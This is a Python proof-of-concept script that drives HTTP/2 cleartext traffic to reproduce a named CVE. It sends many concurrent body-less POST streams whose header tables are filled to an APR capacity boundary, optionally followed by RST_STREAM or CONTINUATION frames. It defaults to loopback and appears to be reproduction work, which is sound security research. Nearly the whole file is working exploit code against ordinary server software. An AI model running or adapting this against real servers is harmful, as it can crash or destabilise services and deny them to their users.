#!/usr/bin/env python3
"""Loopback-only h2c traffic driver for CVE-2026-119618.

Sends body-less requests with Content-Type, no Content-Length, and a header
table filled exactly to an APR capacity boundary (78 fillers + content-type
+ synthesised Host = 80 entries).  Raw HTTP/2 frames via h2client.py keep
many streams genuinely in flight on one connection.

The public repo googlesky/CVE-2026-119618 is the source of h2client.py
(MIT); this driver and the observations are this plant's own reproduction.
"""
import argparse
import os
import threading
import time

from h2client import H2Connection, ConnectionClosed, ProtocolError, default_headers

CT = "content-type"
FILL_VALUE = os.environ.get("FILL_VALUE", "v")
FILL_KEY = os.environ.get("FILL_KEY", "x-pad")


def trigger_headers(conn, sid, fill, shape):
    headers = default_headers(method="POST")
    for i in range(fill):
        headers.append(("%s-%03d" % (FILL_KEY, i), FILL_VALUE))
    headers.append((CT, "application/x-www-form-urlencoded"))
    conn.send_request_headers(sid, headers, end_stream=True)
    if shape == "rst":
        conn.send_rst_stream(sid, 8)
    elif shape == "cont":
        conn.send_continuation(sid, [("x-split", "1")])


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.requests = 0
        self.responses = 0
        self.errors = 0
        self.closed = 0

    def bump(self, field, n=1):
        with self.lock:
            setattr(self, field, getattr(self, field) + n)


def hammer(host, port, fill, shape, streams, deadline, stats):
    try:
        conn = H2Connection(host, port, timeout=5.0)
        conn.handshake()
    except (OSError, ProtocolError, ConnectionClosed):
        stats.bump("errors")
        return
    sid = 1
    try:
        while time.time() < deadline:
            for _ in range(streams):
                if time.time() >= deadline:
                    break
                try:
                    trigger_headers(conn, sid, fill, shape)
                except (OSError, ConnectionClosed):
                    stats.bump("closed")
                    return
                sid += 2
                stats.bump("requests")
            conn.sock.settimeout(0.15)
            try:
                for _ in range(streams * 2):
                    conn.read_frame()
                    stats.bump("responses")
            except (OSError, ConnectionClosed):
                stats.bump("closed")
                return
    finally:
        conn.close()


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--fill", type=int, default=78)
    p.add_argument("--shape", choices=["full", "rst", "cont"], default="full")
    p.add_argument("--connections", type=int, default=8)
    p.add_argument("--streams", type=int, default=100)
    p.add_argument("--duration", type=float, default=30.0)
    a = p.parse_args()

    stats = Stats()
    deadline = time.time() + a.duration
    threads = []
    for _ in range(a.connections):
        t = threading.Thread(target=hammer,
                             args=(a.host, a.port, a.fill, a.shape,
                                   a.streams, deadline, stats), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=a.duration + 15)
    print("sent=%d responses=%d errors=%d closed=%d" %
          (stats.requests, stats.responses, stats.errors, stats.closed),
          flush=True)


if __name__ == "__main__":
    main()
